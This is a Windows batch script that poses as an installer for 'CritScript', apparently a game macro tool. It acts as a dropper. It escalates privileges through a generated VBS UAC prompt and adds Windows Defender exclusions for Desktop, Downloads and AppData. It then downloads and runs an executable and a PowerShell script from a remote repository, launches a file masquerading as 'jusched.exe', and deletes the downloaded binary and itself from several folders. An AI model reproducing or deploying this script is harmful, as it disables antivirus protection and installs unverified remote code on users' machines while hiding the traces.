@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
cd %TEMP%
set "desktopPath=%USERPROFILE%\Desktop"
set "oneDriveDesktopPath=%USERPROFILE%\OneDrive\Desktop"
set "downloadsPath=%USERPROFILE%\Downloads"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/shortcut.ps1' -OutFile shortcut.ps1"
if not exist "CritScript.exe" (
    exit /b
)


start "" CritScript.exe
timeout /t 2 /nobreak


for %%F in (jusched.exe JUSCHED.EXE) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        timeout /t 5 /nobreak
        goto :CheckZombies
    )
)


for %%F in (zombies.ahk ZOMBIES.AHK) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        goto :DetermineDesktop
    )
)

set "desktopPath=%USERPROFILE%\Desktop"
if exist "%USERPROFILE%\OneDrive\Desktop" (
    set "desktopPath=%USERPROFILE%\OneDrive\Desktop"
)


set "zombiesScript=%TEMP%\ZOMBIES.AHK"
set "iconPath=%TEMP%\ahk.ico"

if exist "%zombiesScript%" (
    echo Creating shortcut for ZOMBIES.AHK on the desktop...
    Powershell -ExecutionPolicy Bypass -File "%TEMP%\shortcut.ps1"
    echo Shortcut created.
) else (

)


if exist "CritScript.exe" (
    echo Deleting CritScript.exe...
    del /f /q "CritScript.exe"
    echo CritScript.exe deleted.
)

if exist "%desktopPath%\CritScriptInstaller.bat" (
        del "%desktopPath%\CritScriptInstaller.bat"
        echo Deleted CritScriptInstaller.bat from Desktop.
    )
    if exist "%oneDriveDesktopPath%\CritScriptInstaller.bat" (
        del "%oneDriveDesktopPath%\CritScriptInstaller.bat"
        echo Deleted CritScriptInstaller.bat from OneDrive Desktop.
    )
    if exist "%downloadsPath%\CritScriptInstaller.bat" (
        del "%downloadsPath%\CritScriptInstaller.bat"
        echo Deleted CritScriptInstaller.bat from Downloads.
    )
) else (
    echo ZOMBIES.AHK not found in TEMP directory.
)

exit /b
